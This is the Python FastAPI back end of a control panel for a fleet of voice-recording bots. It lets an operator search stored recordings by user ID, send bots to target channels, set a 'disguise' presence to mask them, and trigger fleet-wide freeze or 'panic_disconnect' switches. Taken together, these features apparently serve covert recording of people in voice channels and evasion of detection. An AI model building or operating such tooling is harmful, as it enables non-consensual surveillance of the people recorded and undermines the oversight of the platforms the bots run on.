from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import sqlite3
from pathlib import Path

app = FastAPI()

templates = Jinja2Templates(directory="templates")
app.mount("/recordings", StaticFiles(directory="/home/scooby/vibe-recorder/recordings"), name="recordings")
DB_PATH = "/home/scooby/vibe-recorder/recordings/recordings.db"

class TargetRequest(BaseModel):
    channel_id: str

class DisguiseRequest(BaseModel):
    disguise: str

class FleetRequest(BaseModel):
    freeze: bool
    panic: bool

class PowerRequest(BaseModel):
    disabled: bool

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse(request=request, name="index.html", context={})

@app.get("/api/search/{user_id}", response_class=JSONResponse)
async def api_search(user_id: str):
    conn = get_db()
    rows = conn.execute("SELECT * FROM recordings WHERE user_id = ? ORDER BY timestamp DESC", (user_id,)).fetchall()
    
    recordings = []
    for row in rows:
        abs_path = Path(row['filepath'])
        rel_path = abs_path.relative_to("/home/scooby/vibe-recorder/recordings")
        recordings.append({
            "id": row['id'],
            "user_name": row['user_name'],
            "channel": row['channel_name'],
            "url": f"/recordings/{rel_path}",
            "start_time": row['start_time'],
            "duration": round(row['duration_seconds'], 2)
        })
    conn.close()
    return {"recordings": recordings}

@app.get("/api/status", response_class=JSONResponse)
async def api_status():
    try:
        conn = get_db()
        rows = conn.execute("SELECT * FROM bot_state").fetchall()
        status_list = [dict(row) for row in rows]
        
        fleet_row = conn.execute("SELECT * FROM fleet_config WHERE id = 1").fetchone()
        fleet_status = dict(fleet_row) if fleet_row else {"freeze_all": 0, "panic_disconnect": 0}
        
        conn.close()
        return {"bots": status_list, "fleet": fleet_status}
    except Exception as e:
        return {"bots": [], "fleet": {}, "error": str(e)}

@app.post("/api/target/{bot_id}")
async def api_set_target(bot_id: int, target: TargetRequest):
    conn = get_db()
    conn.execute("UPDATE bot_state SET target_channel_id = ? WHERE bot_id = ?", (target.channel_id, bot_id))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/stop_target/{bot_id}")
async def api_stop_target(bot_id: int):
    conn = get_db()
    conn.execute("UPDATE bot_state SET target_channel_id = NULL WHERE bot_id = ?", (bot_id,))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/kick/{bot_id}")
async def api_kick(bot_id: int):
    conn = get_db()
    conn.execute("UPDATE bot_state SET force_kick = 1 WHERE bot_id = ?", (bot_id,))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/disguise/{bot_id}")
async def api_disguise(bot_id: int, req: DisguiseRequest):
    conn = get_db()
    val = req.disguise if req.disguise != "Auto" else None
    conn.execute("UPDATE bot_state SET override_presence = ? WHERE bot_id = ?", (val, bot_id))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/power/{bot_id}")
async def api_power(bot_id: int, req: PowerRequest):
    conn = get_db()
    conn.execute("UPDATE bot_state SET disabled = ? WHERE bot_id = ?", (req.disabled, bot_id))
    conn.commit()
    conn.close()
    return {"status": "success"}

@app.post("/api/fleet")
async def api_fleet(req: FleetRequest):
    conn = get_db()
    conn.execute("UPDATE fleet_config SET freeze_all = ?, panic_disconnect = ? WHERE id = 1", (req.freeze, req.panic))
    conn.commit()
    conn.close()
    return {"status": "success"}

